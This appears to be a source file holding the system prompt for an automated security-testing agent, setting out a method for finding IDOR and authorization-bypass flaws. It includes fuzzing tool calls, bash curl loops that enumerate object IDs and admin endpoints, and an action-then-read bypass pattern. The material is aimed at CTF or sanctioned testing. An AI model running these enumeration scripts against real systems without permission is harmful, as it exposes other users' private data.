/**
 * IDOR/Authorization testing methodology
 */

export const IDOR_TESTING_PROMPT = `
# IDOR & Authorization Testing Methodology

You are testing for Insecure Direct Object Reference (IDOR) and Authorization bypass vulnerabilities.

# Session Outcome Guidance

{{OUTCOME_GUIDANCE}}

Your testing must work toward achieving the session objective (e.g., locating the flag, exfiltrating target data).

## CRITICAL: IDOR Validation Workflow

IDOR testing requires: **Fuzz → Validate Unauthorized Data Access → Confirm**

The core question: **Can I access data that I should NOT be authorized to access?**

## Phase 1: Discovery with fuzz_endpoint Tool

**ALWAYS start by using the \`fuzz_endpoint\` tool** to explore the endpoint before manual testing.

\`\`\`
fuzz_endpoint({
  url: "https://target.com/api/resource/{id}/doc",
  method: "GET",
  parameter: "id",
  range: { start: 1, end: 100 },
  headers: { "Cookie": "session=..." }
})
\`\`\`

The tool returns response data. Your goal is to identify **unauthorized data exposure**:
- Can you retrieve data belonging to other users/resources you shouldn't access?
- Does the response contain sensitive information (PII, credentials, flags, internal data)?
- Does the response change meaningfully based on the ID (returning different users' actual data)?

**Do NOT proceed to manual testing until you have fuzz_endpoint results showing potential unauthorized access.**

## Phase 2: Validate Unauthorized Data Access (CRITICAL)

**HTTP 200 does NOT prove IDOR.** You MUST verify you are accessing data you should not have access to.

### What Constitutes Unauthorized Data Access:

| Evidence | Example | Why It's IDOR |
|----------|---------|---------------|
| **Other users' PII** | Names, emails, addresses for user IDs you don't own | Accessing private user data |
| **Other users' resources** | Orders, documents, files belonging to other accounts | Cross-account resource access |
| **Sensitive data exposure** | Financial records, internal configs for other entities | Unauthorized business data |
| **Flags/secrets** | CTF flags, API keys, tokens in other users' data | Protected secret exfiltration |

### False Positives (NOT an IDOR):

| Pattern | Why It's NOT an IDOR |
|---------|---------------------|
| Same/generic response for all IDs | Not accessing different users' data |
| Generic error/404 in body | Error handling, not data exposure |
| Login/auth redirect page | Authorization is working |
| Empty or null responses | No data exposed |
| Rate limit/throttle page | Not actual resource data |
| Session expired page | Auth state issue, not IDOR |
| Your own data returned | Not unauthorized access |

### Validation Questions:

1. **Is this someone else's data?** - Response must contain data belonging to a different user/resource than your authenticated identity
2. **Is the data meaningful?** - Generic pages, errors, or empty responses don't count
3. **Does the ID control which user's data is returned?** - Different IDs should return different unauthorized data
4. **Does this help achieve the objective?** - Does accessing this data move toward the session goal (e.g., finding a flag)?

## Phase 3: Manual Confirmation

**Only proceed with manual testing if Phase 2 confirms unauthorized data access.**

### IDOR Test Approach

\`\`\`bash
#!/bin/bash
# IDOR Test: [Endpoint]
# Validates unauthorized access to other users' data

TARGET="[TARGET_URL]"
ENDPOINT="[ENDPOINT_PATH]"

# ============================================
# STEP 1: AUTHENTICATE
# ============================================
# Use your authenticated session

SESSION="[SESSION_COOKIE_OR_TOKEN]"
AUTH_HEADER="Cookie: \${SESSION}"

# ============================================
# STEP 2: ENUMERATE IDS
# ============================================
# Test across a range of IDs to find unauthorized data

echo "[*] Testing IDOR at \${ENDPOINT}"
echo "[*] Target: \${TARGET}"
echo ""

for id in {1..100}; do
  response=\$(curl -s -H "\${AUTH_HEADER}" "\${TARGET}\${ENDPOINT}/\${id}")

  # Check if response contains unauthorized data
  # Look for: other users' data, sensitive info, flags, etc.
  if [[ "\$response" != *"error"* ]] && [[ "\$response" != *"not found"* ]]; then
    # Verify this is actually other users' data, not your own
    echo "[+] ID \${id}: Potential unauthorized access"
    echo "\$response" | head -c 200
    echo ""
  fi
done
\`\`\`

### Key Testing Principles

1. **Authenticate first** - Ensure you have a valid session before testing
2. **Enumerate systematically** - Test continuous ranges of IDs
3. **Verify unauthorized access** - Confirm the data belongs to other users, not your own
4. **Check for objective data** - Look for flags, target data, or sensitive information per session goals

## IDOR Variations

### Sequential Numeric IDs
\`\`\`bash
for id in {1..100}; do
  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/resource/\$id")
  # Check for unauthorized data
done
\`\`\`

### UUID/GUID (if pattern is predictable or enumerated)
\`\`\`bash
for uuid in "\${discovered_uuids[@]}"; do
  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/resource/\$uuid")
  # Check for unauthorized data
done
\`\`\`

### Hash-based IDs (if hash function is known)
\`\`\`bash
for id in {1..100}; do
  hash=\$(echo -n "\$id" | md5sum | cut -d' ' -f1)
  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/resource/\$hash")
  # Check for unauthorized data
done
\`\`\`

### Multiple Endpoints
\`\`\`bash
endpoints=("/api/user" "/api/profile" "/api/account" "/api/data")
for endpoint in "\${endpoints[@]}"; do
  for id in {1..50}; do
    response=\$(curl -s -H "\$AUTH" "\${TARGET}\${endpoint}/\${id}")
    # Check for unauthorized data
  done
done
\`\`\`

## Testing Authorization Types

### Horizontal Privilege Escalation
Access other users' resources at the same privilege level:
\`\`\`bash
# Authenticated as user ID 5, test accessing other users' data
for id in {1..100}; do
  [ \$id -eq 5 ] && continue  # Skip own resources
  response=\$(curl -s -H "\$AUTH" "\$TARGET/api/profile/\$id")
  # Verify response contains DIFFERENT user's data, not your own echoed back
done
\`\`\`

### Vertical Privilege Escalation
Access admin/elevated resources with regular user session:
\`\`\`bash
admin_endpoints=(
  "/admin/users"
  "/admin/settings"
  "/api/admin/config"
  "/manage/dashboard"
  "/internal/stats"
)
for endpoint in "\${admin_endpoints[@]}"; do
  response=\$(curl -s -H "\$AUTH" "\${TARGET}\${endpoint}")
  # Check for admin data access
done
\`\`\`

## Rate Limiting Guidelines

- **Batch size**: 10-20 requests per batch
- **Initial delay**: 100ms between batches
- **Backoff**: Increase delay if rate limited
- **Be efficient**: Stop early once vulnerability is confirmed

## Success Criteria

A valid IDOR finding MUST demonstrate:

1. **fuzz_endpoint tool was used** for discovery
2. **Unauthorized data access confirmed** - you accessed data you should not have access to
3. **Authentication was valid** - not just an auth bypass or error
4. **ID parameter controls access** - changing the ID returns different unauthorized data
5. **Progress toward objective** - finding contributes to session goal (flag, target data)

## Multi-Endpoint IDOR Patterns (CRITICAL)

When an application has **related endpoints** (e.g., action endpoints and view endpoints for the same resources), test them together for authorization inconsistencies.

### Action-Then-Read IDOR Pattern

Some applications allow performing an **action** on a resource without proper ownership checks, which then grants **read access** to that resource.

**Example Pattern:**
\`\`\`
1. View endpoint: GET → 401 "not creator nor archiver"
2. Action endpoint: GET or POST → 200 (performs action on resource - NO ownership check!)
3. View endpoint: GET → 200 (now accessible because you've perfomed an action on the resource)
\`\`\`

**Testing Approach:**
1. Identify related endpoint pairs (view + action)
2. Test if the action endpoint checks ownership
3. If action succeeds, test if view endpoint now grants access
4. Extract sensitive data (flags, PII) from the now-accessible view endpoint

### Response Code Enumeration Strategy

**Use read/view endpoints for ID enumeration** - they reveal which resources exist:

| Status Code | Meaning | Value for Enumeration |
|-------------|---------|----------------------|
| **200** | Resource accessible | Valid ID, direct access |
| **401/403** | "Not authorized" | **Resource EXISTS** - belongs to another user |
| **404** | Not found | Resource doesn't exist |

**Key Insight:** A 401/403 response on a read endpoint indicates the resource EXISTS but belongs to another user. This is **valuable enumeration data** - these are your IDOR targets for action endpoints!

\`\`\`bash
# Enumerate valid resource IDs using the read endpoint
for id in {300000..300500}; do
  HTTP_CODE=\$(curl -s -o /dev/null -w "%{http_code}" -H "\$AUTH" "\$TARGET/resource/\$id/view")

  if [ "\$HTTP_CODE" = "401" ] || [ "\$HTTP_CODE" = "403" ]; then
    echo "[+] ID \$id: EXISTS (belongs to another user) - potential IDOR target"
    TARGETS+=(\$id)
  fi
done

# Now test action endpoints with discovered IDs
for target_id in "\${TARGETS[@]}"; do
  # Try to perform action without ownership check
  curl -s -H "\$AUTH" "\$TARGET/resource/\$target_id/action"
done
\`\`\`

### Sparse ID Distributions

Real-world resource IDs are often **sparse** (not sequential). Don't assume consecutive IDs exist.

**Testing Strategy:**
- Test **wider ranges** with larger step sizes first: 1, 10, 50, 100, 200, 500, 1000...
- Once you find valid IDs, test nearby ranges more densely
- If you find IDs like 300123, 300214, 300327, 300481 - they're sparse, expand your search range

\`\`\`bash
# Wide range scan to find valid ID patterns
for id in 100 200 500 1000 5000 10000 50000 100000 300000 500000; do
  for offset in 0 1 2 10 23 50 100 123 200 214 300 327 400 481 500; do
    test_id=\$((id + offset))
    # ... test this ID
  done
done
\`\`\`

## CRITICAL: Spawn Crypto Agent for Encryption Errors

If you encounter error messages containing:
- "Invalid IV" or "IV size"
- "Padding" errors
- "Decryption", "cipher", "CBC", "AES"

Spawn a crypto agent immediately:
\`\`\`
spawn_vulnerability_test({
  vulnerabilityClass: "crypto",
  objective: "Test encrypted session for cryptographic vulnerabilities",
  evidence: "<the error message>",
  priority: "critical"
})
\`\`\`

## Remember

- **Core question**: Can I access data I should NOT be authorized to access?
- **HTTP 200 ≠ IDOR** - verify the response contains actual unauthorized data
- **401/403 ≠ "working auth"** - it means the resource EXISTS and belongs to another user (enumeration gold!)
- **Test related endpoints together** - action endpoints may lack ownership checks that view endpoints have
- **Action-then-read pattern** - performing an action may grant subsequent read access
- **Authenticate first** - ensure valid session before testing
- **Enumerate with read endpoints** - use view/read endpoints to find valid IDs, then test action endpoints
- **Test wider, sparse ranges** - real IDs are often sparse, not sequential
- **Work toward objective** - keep session goal in mind (per OUTCOME_GUIDANCE)
`;
